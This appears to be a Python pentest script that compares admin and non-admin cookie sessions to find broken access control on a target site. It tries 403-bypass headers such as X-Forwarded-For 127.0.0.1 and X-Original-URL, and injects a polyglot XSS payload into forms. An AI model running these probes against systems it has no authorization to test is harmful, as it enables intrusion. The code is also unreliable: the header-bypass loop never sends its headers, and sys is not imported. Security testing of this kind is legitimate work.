import time
from urllib.parse import urljoin, urlparse
import requests
from bs4 import BeautifulSoup
import requests
import httpx
import asyncio
import argparse
from httpx import AsyncClient



def is_valid_url(url):
    try:
        if "tel" in url.lower():
            return False
        parsed_url = urlparse(url)
        return bool(parsed_url.scheme) and bool(parsed_url.netloc)
    except ValueError:
        return False


async def follow_redirects_within_domain(session, url, cookies, max_redirects=5):
    if not is_valid_url(url):
        print(f"Invalid URL encountered: {url}")
        return

    domain = urlparse(url).hostname
    current_url = url
    redirect_count = 0

    while redirect_count < max_redirects:
        response = await session.get(current_url, cookies=cookies)
        if response.status_code in (301, 302):
            location = response.headers.get('Location')
            redirect_url = urljoin(current_url, location)

            if not redirect_url:
                break

            if not is_valid_url(redirect_url):
                print(f"Invalid URL encountered: {redirect_url}")
                break

            redirect_domain = urlparse(redirect_url).hostname
            if redirect_domain == domain or (redirect_domain and redirect_domain.endswith(f".{domain}")):
                current_url = redirect_url
                redirect_count += 1
            else:
                break
        else:
            break

    return response


async def test_vulnerabilities(url, session):
    xss_payload = '''jaVasCript:/*-/*`/*\`/*/*/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\sVg/<sVg/oNloAd=alert()//>'''

    # Get the page content
    response = await session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    # Find the first form in the page
    form = soup.find("form")
    if not form:
        print("[*] No form found on the page")
        return

    # Find all input fields in the form
    input_fields = form.find_all("input", {'id': True})

    # Test XSS
    for input_field in input_fields:
        form_data = {input_field["id"]: xss_payload}
        post_url = urljoin(url, form.get("action", ""))
        
        if not is_valid_url(post_url):
            print(f"Invalid URL encountered: {post_url}")
            continue

        response = await session.post(post_url, data=form_data)
        if xss_payload in response.text:
            print(f"[XSS] Possible XSS vulnerability detected at {url}")
            break

from http.cookies import SimpleCookie
def get_cookies_from_input(user_cookies_str):
    cookie = SimpleCookie()
    cookie.load(user_cookies_str)
    cookies = {key: morsel.value for key, morsel in cookie.items()}
    return cookies

def find_all_links(html):
    soup = BeautifulSoup(html, 'html.parser')
    links = soup.find_all('a', href=True)

    all_links = [link['href'] for link in links]

    return all_links


cookie_jar = requests.cookies.RequestsCookieJar()


async def check_broken_access_permissions(colaborator, url, session, user_cookies, admin_links, current_user):
    broken_access_links = []
    processed_links = set()
    unique_admin_links = []

    for link in admin_links:
        if link not in unique_admin_links:
            unique_admin_links.append(link)

    for link in unique_admin_links:
        if link.startswith("http"):
            full_url = link
        else:
            full_url = f"{url}{link}"
    
        if not is_valid_url(full_url):
            print(f"Invalid URL encountered: {full_url}")
            continue

        if full_url in processed_links:
            continue

        processed_links.add(full_url)

        response = await follow_redirects_within_domain(session, full_url, user_cookies)
        status_code = response.status_code
        print(f"[*] Status code for {current_user} - {full_url} {status_code}")

        if status_code == 200:
            broken_access_links.append(link)
            print(f"[*] Broken access permission found for the link: {full_url}")
            await test_vulnerabilities(full_url, session)

        elif status_code == 403:
            headers = {
                "X-Forwarded-For": "127.0.0.1",
                "X-Rewrite-URL": full_url,
                "X-Original-URL": full_url,
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Custom-Referrer": f"{colaborator}",
                "X-Custom-Origin": f"{colaborator}",
            }
            for header, value in headers.items():
                new_session = requests.Session()
                new_session.headers.update({header: value})
                response = await follow_redirects_within_domain(session, full_url, user_cookies)
                if response.status_code == 200:
                    print(f"[*] Possible bypass detected with header '{header}' at {full_url}")
                    break

    return broken_access_links



async def main(url, colaborator, user1_cookies, user2_cookies):
    if not is_valid_url(url) or not is_valid_url(colaborator):
        print("Please provide valid URLs for the target site and the collaborator.")
        return

    # The rest of the function remains unchanged
    user1_credentials = ("ADMIN USER", user1_cookies) 
    user2_credentials = ("NON ADMIN USER", user2_cookies) 
    
    async with httpx.AsyncClient() as session1:
        session1.cookies.update(user1_cookies)
        async with httpx.AsyncClient() as session2:
            session2.cookies.update(user2_cookies)

            user1_html = await session1.get(url)
            user1_html = user1_html.text
            user1_admin_links = find_all_links(user1_html)
            print(f'Admin links for user {user1_credentials[0]}: {user1_admin_links}')

            user2_html = await session2.get(url)
            user2_html = user2_html.text
            user2_admin_links = find_all_links(user2_html)
            print(f'Admin links for user {user2_credentials[0]}: {user2_admin_links}')

            # Check broken access permissions

            try:
                # Broken access permissions for User 2: {broken_access_links}
                broken_access_links = await check_broken_access_permissions(colaborator, url, session2, user2_cookies, user1_admin_links, user2_credentials[0])

                print(f"Broken access permissions for user {user2_credentials[0]}: {broken_access_links}")

            except KeyboardInterrupt:
                print("\nInterrupted by user.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test website vulnerabilities.")
    parser.add_argument("--url", "-u", required=True, help="Target URL")
    parser.add_argument("--colaborator", "-c", required=True, help="Colaborator URL")
    parser.add_argument("--user1_cookies", "-u1", required=True, help="User 1 cookies in the format: key=value; key=value")
    parser.add_argument("--user2_cookies", "-u2", required=True, help="User 2 cookies in the format: key=value; key=value")

    args = parser.parse_args()

    url = args.url
    colaborator = args.colaborator
    user1_cookies_str = args.user1_cookies
    user2_cookies_str = args.user2_cookies

    if not url or not colaborator or not user1_cookies_str or not user2_cookies_str:
        print("Please provide all required arguments.")
        parser.print_help()
        sys.exit(1)

    user1_cookies = get_cookies_from_input(user1_cookies_str)
    user2_cookies = get_cookies_from_input(user2_cookies_str)

    asyncio.run(main(url, colaborator, user1_cookies, user2_cookies))
